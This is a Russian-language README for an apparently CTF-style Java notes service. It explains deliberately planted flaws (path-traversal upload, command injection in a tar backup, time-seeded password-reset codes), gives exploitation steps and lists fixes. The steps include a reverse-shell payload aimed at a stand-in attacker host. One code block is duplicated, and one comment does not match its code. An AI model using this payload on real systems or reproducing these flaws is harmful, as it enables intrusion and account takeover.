# JerkNotes
## Базовый сценарий
Пользователь может создавать заметки, загружать файлы, делать бэкапы заметок и восстанавливать их. Также есть функционал восстановления пароля через email.

### Все фичи
- Создание, просмотр и удаление заметок
- Загрузка файлов
- Бэкап и восстановление заметок
- Восстановление пароля через email

## Архитектура
Веб-приложение на Java Spring Boot. Заметки хранятся как сериализованные Java объекты в файловой системе. При бэкапе используется команда `tar`.

## Уязвимости

### Небезопасная десериализация Java объектов и Command Injection

При загрузке файлов нет проверки на path traversal, что позволяет загрузить файл в директорию заметок пользователя с произвольным именем. Более того, можно загрузить сериализованный Java объект `Note` с произвольным содержимым.

```java
public String upload(MultipartFile file, String userId) {
    try {
        if (file.isEmpty()) {
            return "Failed to upload";
        }
        String fileName = StringUtils.cleanPath(file.getOriginalFilename());
        Path outputPath = Paths.get(appConfig.getBaseFileDir(), userId);
        Files.copy(file.getInputStream(), outputPath.resolve(fileName));
        return "Successfully uploaded";
    } catch (IOException | NullPointerException e) {
        return "Failed to upload";
    }
}
```

При создании бэкапа заметок метод `backup()` выполняет команду через `bash -c`, подставляя `filePath` из объекта `Note` напрямую в команду без экранирования:

```java
public void backup() {
    try {
        String[] cmd = {"bash", "-c", String.format("tar -cf %s.tar %s", filePath, filePath)};
        Process p = Runtime.getRuntime().exec(cmd);
        // ...
    }
}
```

Если в `filePath` содержится команда (например, `file; command`), она будет выполнена при создании бэкапа.

```java
public String upload(MultipartFile file, String userId) {
    try {
        if (file.isEmpty()) {
            return "Failed to upload";
        }
        String fileName = StringUtils.cleanPath(file.getOriginalFilename());
        Path outputPath = Paths.get(appConfig.getBaseFileDir(), userId);
        Files.copy(file.getInputStream(), outputPath.resolve(fileName));
        return "Successfully uploaded";
    } catch (IOException | NullPointerException e) {
        return "Failed to upload";
    }
}
```

### Race condition в восстановлении пароля

При запросе сброса пароля для пользователя генерируется код восстановления, который отправляется на email. Проблема в том, что код генерируется на основе текущего времени в секундах, и если два запроса приходят в одну и ту же секунду, они могут получить одинаковый код.

```java
public String generateRandomString() {
    long currentTimeSeconds = Instant.now().getEpochSecond();
    Random random = new Random(currentTimeSeconds);
    StringBuilder randomString = new StringBuilder(STRING_LENGTH);
    for (int i = 0; i < STRING_LENGTH; i++) {
        int index = random.nextInt(CHARACTERS.length());
        randomString.append(CHARACTERS.charAt(index));
    }
    return randomString.toString();
}
```

Более критично, что при проверке кода восстановления нет проверки, что код принадлежит именно тому пользователю, для которого он был запрошен. Если злоумышленник запросит сброс пароля для жертвы, а затем для себя, и оба запроса придут в одну секунду, они получат одинаковый код. Затем злоумышленник может использовать свой код для сброса пароля жертвы.

```java
public boolean CheckResetCode(String code, String username) {
    User user = userRepository.findByUsername(username);
    if (user == null) {
        return false;
    }
    List<RecoveryCode> codes = resetCodeRepository.findByUserId(user.getId());
    // ...
    for (RecoveryCode recoveryCode : codes) {
        if (recoveryCode.getCode().equals(code)) {
            // Проверяется только код, но не проверяется, что он был создан для этого пользователя
            Duration duration = Duration.between(recoveryCode.getCreatedAt(), now);
            if (duration.toMinutes() <= 20) {
                resetCodeRepository.deleteById(recoveryCode.getId());
                return true; 
            }
        }
    }
    return false;
}
```

## Эксплуатация

### Небезопасная десериализация Java объектов и Command Injection
1. Создаём сериализованный Java объект `Note` с payload в поле `filePath`, содержащий команду для выполнения (например, `bash -i >& /dev/tcp/attacker/port 0>&1`)
2. Загружаем этот файл через path traversal в директорию заметок пользователя (например, `../../../../../../app/notes/{uid}/{uid}`)
3. Вызываем `/api/notes/backup`, который при обработке загруженного файла выполнит команду из `filePath` через `bash -c`
4. Получаем reverse shell или выполняем другую произвольную команду

### Race condition в восстановлении пароля
1. Запрашиваем сброс пароля для жертвы (email из attack_data)
2. Сразу же запрашиваем сброс пароля для своего контролируемого email
3. Если оба запроса придут в одну секунду, коды будут одинаковыми
4. Получаем код из своего email
5. Используем этот код для сброса пароля жертвы
6. Входим в аккаунт жертвы и читаем заметки с флагами

## Как фиксить

### Небезопасная десериализация Java объектов
- Использовать whitelist для десериализации
- Валидировать имена файлов при загрузке, запретить path traversal
- Использовать безопасные методы для работы с архивами вместо выполнения команд через Runtime.exec

### Race condition в восстановлении пароля
- Использовать криптографически стойкий генератор случайных чисел (не на основе времени)
- Добавить проверку, что код восстановления был создан именно для указанного пользователя
- Использовать уникальные идентификаторы для каждого кода восстановления

